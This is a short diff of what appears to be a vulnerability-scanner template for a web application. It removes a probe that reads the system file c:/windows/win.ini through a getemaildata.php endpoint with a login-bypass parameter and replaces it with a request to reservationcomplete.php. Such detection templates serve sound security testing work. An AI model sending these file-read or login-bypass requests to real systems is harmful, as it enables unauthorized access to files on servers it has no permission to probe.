@@ -8,7 +8,7 @@ info:
   repair:
 requests1:
   method: GET
-  path: /ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini
+  path: /background/reservationcomplete.php?ID=1
   headers:
 response1:
   headers:
